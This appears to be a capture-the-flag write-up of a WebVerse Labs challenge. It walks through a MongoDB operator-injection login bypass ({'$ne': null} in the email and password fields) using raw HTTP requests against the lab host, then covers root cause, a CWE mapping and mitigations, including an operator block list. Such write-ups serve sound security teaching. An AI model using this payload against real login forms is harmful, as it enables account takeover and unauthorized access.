---
title: "NoSQL Injection Authentication Bypass | Herbalist Remedies"
date: 2026-05-28 18:00:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [webverselabs-pro, nosql, mongodb, authentication-bypass, injection, web-security]
platform: WebVerse Labs
author: Shivansh Sharma
image:
  path: /assets/images/posts/herbalist-remedies.webp
  alt: Herbalist Remedies NoSQL Injection Authentication Bypass
---

## Lab Link

Lab: [Herbalist Remedies](https://dashboard.webverselabs-pro.com/challenges/herbalist)

---

## Overview

**Herbalist Remedies** is an herbal-blend e-commerce application that relies on a MongoDB-backed authentication mechanism. The login functionality fails to properly validate user-supplied input before constructing database queries.

By injecting MongoDB operators into the authentication request, it is possible to bypass login controls entirely and gain access to another user's account without knowing valid credentials.

This vulnerability is a classic example of **NoSQL Injection leading to Authentication Bypass**.

---

## Objective

Gain unauthorized access to the application by exploiting the vulnerable login functionality and retrieve the flag.

---

## Scenario

> Herbalist Remedies has been quietly selling single-origin tinctures and small-batch teas online since 2014, run out of a converted dairy barn in western Massachusetts by a husband-and-wife team and one part-time fulfillment helper. Two-ounce bottles are $24, the gift box is $72, and the storefront has been on the same codebase since launch — the founder's brother wrote it over a long winter and hasn't been asked to touch it since.

---

## Reconnaissance

The application provides a standard login page:

```text
https://902305ad-4065-herbalist-d4de5.challenges.webverselabs-pro.com/login
```

A login attempt with dummy credentials generates a request containing email and password parameters.

The application's behavior suggests that user-controlled input may be directly incorporated into a MongoDB query without sufficient validation.

---

## Vulnerability Analysis

Many MongoDB authentication implementations perform queries similar to:

```javascript
db.users.findOne({
    email: userInputEmail,
    password: userInputPassword
})
```

If user input is accepted as JSON objects instead of strict strings, MongoDB operators can be injected into the query.

One particularly useful operator is:

```javascript
$ne
```

which means:

```javascript
not equal
```

Therefore:

```javascript
{
  "$ne": null
}
```

matches any value that is not null.

If both authentication fields are replaced with this condition, the resulting query becomes:

```javascript
db.users.findOne({
    email: { "$ne": null },
    password: { "$ne": null }
})
```

This causes MongoDB to return the first account that satisfies both conditions, effectively bypassing authentication.

---

## Exploitation

### Step 1: Capture Login Request

Intercept a login attempt using Burp Suite with any dummy credentials.

Example:

```http
POST /login HTTP/2
Host: 902305ad-4065-herbalist-d4de5.challenges.webverselabs-pro.com
Content-Type: application/json

{
  "email":"test@test.com",
  "password":"password"
}
```

---

### Step 2: Inject MongoDB Operators

Replace the supplied credentials with:

```json
{
  "email": {
    "$ne": null
  },
  "password": {
    "$ne": null
  }
}
```

Modified request:

```http
POST /login HTTP/2
Host: 902305ad-4065-herbalist-d4de5.challenges.webverselabs-pro.com
Content-Type: application/json

{
  "email":{"$ne":null},
  "password":{"$ne":null}
}
```

Forward the request.

---

### Step 3: Authentication Bypass

After forwarding the malicious request, the application authenticates the session successfully and redirects to:

```text
https://902305ad-4065-herbalist-d4de5.challenges.webverselabs-pro.com/account
```

This confirms that authentication controls have been bypassed.

---

## Post-Authentication Enumeration

After obtaining access to the account area, further application functionality becomes accessible.

Navigating through administrative endpoints reveals:

```text
https://902305ad-4065-herbalist-d4de5.challenges.webverselabs-pro.com/admin/flag
```

---

## Proof of Exploitation

Visiting the administrative flag endpoint returns the challenge flag:

```text
WEBVERSE{.....}
```

---

## Impact

Successful exploitation allows an attacker to:

- Bypass authentication controls
- Access arbitrary user accounts
- Gain unauthorized access to sensitive information
- Potentially obtain administrative privileges
- Access restricted administrative functionality
- Compromise confidentiality and integrity of application data

In real-world environments, this type of vulnerability can lead to complete account takeover and administrative compromise.

---

## Root Cause

The application trusts user-controlled JSON objects and directly embeds them into MongoDB queries.

Instead of validating input as strings:

```javascript
{
    email: "user@example.com",
    password: "password123"
}
```

the application accepts attacker-controlled operators such as:

```javascript
{
    email: { "$ne": null },
    password: { "$ne": null }
}
```

allowing query logic to be modified.

---

## Mitigation

### Enforce Strict Input Validation

Only allow expected data types:

```javascript
typeof email === "string"
typeof password === "string"
```

Reject objects and arrays.

### Sanitize MongoDB Operators

Block dangerous operators including:

```javascript
$ne
$gt
$lt
$gte
$lte
$regex
$where
$exists
```

when supplied through user input.

### Use ODM Validation

Frameworks such as Mongoose can help enforce schema validation and prevent operator injection when configured correctly.

### Implement Authentication Hardening

- Rate limiting
- Account lockouts
- Multi-factor authentication
- Security monitoring and alerting

---

## Real-World Insight

NoSQL Injection vulnerabilities are often overlooked because developers focus heavily on SQL Injection defenses. However, document databases such as MongoDB introduce their own injection vectors through query operators.

Authentication bypasses using operators like `$ne`, `$regex`, and `$exists` remain among the most common MongoDB exploitation techniques and frequently appear in penetration tests and bug bounty programs where user input is directly mapped into database queries.

---

## Vulnerability Identification

This challenge is primarily a **NoSQL Injection Authentication Bypass** vulnerability.

### Classification Hierarchy

**OWASP Top 10:2025**

```text
A03 - Injection
 └── NoSQL Injection
      └── MongoDB Operator Injection
           └── Authentication Bypass
```

### CWE Mapping

```text
CWE-943
Improper Neutralization of Special Elements in Data Query Logic
```

---

## Key Takeaway

Never trust user-supplied JSON objects in database queries. Allowing MongoDB operators such as `$ne` to reach backend query logic can completely bypass authentication and expose privileged functionality without requiring valid credentials.